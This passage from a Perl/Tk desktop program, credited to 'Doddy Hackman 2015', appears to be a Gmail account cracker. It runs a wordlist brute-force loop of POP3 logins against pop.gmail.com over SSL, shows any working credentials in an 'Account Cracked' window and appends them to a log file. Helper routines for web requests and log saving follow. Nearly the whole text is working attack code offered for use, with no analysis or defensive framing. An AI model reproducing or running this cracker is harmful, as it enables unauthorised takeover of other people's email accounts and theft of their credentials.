                my $cont = "0";

                my @words = openwordlist($word);

                for my $pass (@words) {
                    chomp $pass;
                    $newdax->update;
                    $status->configure( -text => $pass );
                    sleep($time);
                    my $so = IO::Socket::SSL->new(
                        PeerAddr => "pop.gmail.com",
                        PeerPort => 995,
                        Proto    => "tcp"
                    );

                    my $nave = Mail::POP3Client->new();

                    $nave->User($user);
                    $nave->Pass($pass);
                    $nave->Socket($so);

                    if ( $nave->Connect() ) {
                        $cont = "1";
                        yeaha( "pop.gmail.com", $user, $pass, "Gmail" );
                    }

                    $so->close();
                    $nave->close();
                }
                if ( $cont eq "0" ) {
                    $status->configure( -text => "Not Found" );
                }

            }
            else {
            }
        }
        else {
            $newdax->Dialog(
                -title            => "Error",
                -buttons          => ["OK"],
                -text             => "File Not Found",
                -background       => $color_fondo,
                -foreground       => $color_texto,
                -activebackground => $color_texto
            )->Show();
        }
    }

    sub yeaha {

        my $foundtk = MainWindow->new(
            -background => $color_fondo,
            -foreground => $color_texto
        );
        $foundtk->title("Account Cracked");
        $foundtk->geometry("280x130+20+20");
        $foundtk->resizable( 0, 0 );

        $foundtk->Label(
            -text       => "Host : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 20, -y => 20 );
        my $host_found = $foundtk->Entry(
            -width      => 30,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 67, -y => 25 );
        $foundtk->Label(
            -text       => "Username : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 20, -y => 50 );
        my $user_found = $foundtk->Entry(
            -width      => 24,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 103, -y => 55 );
        $foundtk->Label(
            -text       => "Password : ",
            -font       => "Impact",
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 20, -y => 80 );
        my $pass_found = $foundtk->Entry(
            -width      => 24,
            -background => $color_fondo,
            -foreground => $color_texto
        )->place( -x => 103, -y => 85 );

        $host_found->configure( -text => $_[0] );
        $user_found->configure( -text => $_[1] );
        $pass_found->configure( -text => $_[2] );

        savefile( "cracked-logs.txt",
            $_[3] . ":" . $_[0] . ":" . $_[1] . ":" . $_[2] );

        last;

    }

    sub openwordlist {

        my @words;
        my ($file) = @_;

        open( FILE, $file );
        my @words = <FILE>;
        close FILE;

        return @words;

    }

    sub bronaf {
        $newdax->update;
        $browse = $newdax->FileSelect( -directory => getcwd() );
        my $file = $browse->Show;
        $password->configure( -text => $file );
    }

    sub aboutxaz {
        $newdax->Dialog(
            -title            => "About",
            -buttons          => ["OK"],
            -text             => "(C) Doddy Hackman 2015",
            -background       => $color_fondo,
            -foreground       => $color_texto,
            -activebackground => $color_texto
        )->Show();
    }

    sub openlogsaz {
        my $f = "cracked-logs.txt";
        if ( -f $f ) {
            system($f);
        }
        else {
            $newdax->Dialog(
                -title            => "Error",
                -buttons          => ["OK"],
                -text             => "File Not Found",
                -background       => $color_fondo,
                -foreground       => $color_texto,
                -activebackground => $color_texto
            )->Show();
        }
    }

    sub exitnowaz {
        $newdax->destroy();
    }

}    #End

##

#Funciones vitales

sub toma {
    return $nave->get( $_[0] )->content;
}

sub tomados {
    return $nave->get( $_[0] );
}

sub tomar {
    my ( $web, $var ) = @_;
    return $nave->post( $web, [ %{$var} ] )->content;
}

sub openlogsa {
    system("start logs/info-logs.txt");
}

sub installer {
    unless ( -d "/logs" ) {
        mkdir( "logs/", 777 );
    }
}

sub savefile {
    open( SAVE, ">>logs/" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub repes {
    my @limpio;
    foreach $test (@_) {
        push @limpio, $test unless $repe{$test}++;
    }
    return @limpio;
}

sub ver_length {
    return true if length( $_[0] ) == 32;
}

sub menu_about {
    $mejor->Dialog(
        -title            => "About",
        -buttons          => ["OK"],
        -text             => "(C) Doddy Hackman 2015",
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->Show();
}

sub menu_exit {
    exit(1);
}

#The End ?
